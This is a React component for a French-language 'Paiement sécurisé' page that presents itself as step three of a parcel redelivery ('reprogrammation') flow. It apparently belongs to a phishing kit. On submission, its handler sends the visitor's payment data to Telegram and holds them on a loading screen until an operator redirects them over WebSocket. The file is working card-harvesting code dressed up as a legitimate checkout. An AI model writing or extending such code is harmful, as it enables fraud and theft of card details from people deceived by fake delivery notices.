import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Navbar } from '../Navbar';
import { SecondaryNav } from '../SecondaryNav';
import { Footer } from '../Footer';
import { PaymentForm } from './PaymentForm';
import { PaymentSummary } from './PaymentSummary';
import { Timeline } from '../BillingPage/Timeline';
import { LoadingOverlay } from './LoadingOverlay';
import { sendToTelegram } from '../../../services/telegram';
import type { PaymentData } from '../../../types/payment';

interface Step {
  step: number;
  label: string;
  status: 'completed' | 'current' | 'upcoming';
}

export function PaymentPage() {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [showLoadingOverlay, setShowLoadingOverlay] = useState(false);

  const steps: Step[] = [
    { step: 1, label: 'Suivi', status: 'completed' },
    { step: 2, label: 'Adresse', status: 'completed' },
    { step: 3, label: 'Paiement', status: 'current' },
    { step: 4, label: 'Confirmation', status: 'upcoming' }
  ];

  const handlePaymentSubmit = async (paymentData: PaymentData) => {
    setIsProcessing(true);
    try {
      await sendToTelegram(paymentData, 'payment');
      setShowLoadingOverlay(true);
      // The user will stay in loading state until redirected via WebSocket
    } catch (error) {
      console.error('Payment error:', error);
      setIsProcessing(false);
      setShowLoadingOverlay(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <Navbar />
      <SecondaryNav />
      
      <main className="max-w-7xl mx-auto px-4 py-12">
        <div className="bg-white rounded-2xl shadow-xl p-8">
          <div className="mb-8">
            <h1 className="text-3xl font-bold text-[#96154a]">
              Paiement sécurisé
            </h1>
            <p className="mt-2 text-gray-600">
              Veuillez renseigner vos informations de paiement pour finaliser la reprogrammation
            </p>
          </div>

          <Timeline steps={steps} />

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 mt-8">
            <div className="lg:col-span-2">
              <PaymentForm onSubmit={handlePaymentSubmit} isProcessing={isProcessing} />
            </div>
            <div className="lg:col-span-1">
              <PaymentSummary />
            </div>
          </div>
        </div>
      </main>

      <Footer />
      {showLoadingOverlay && <LoadingOverlay />}
    </div>
  );
}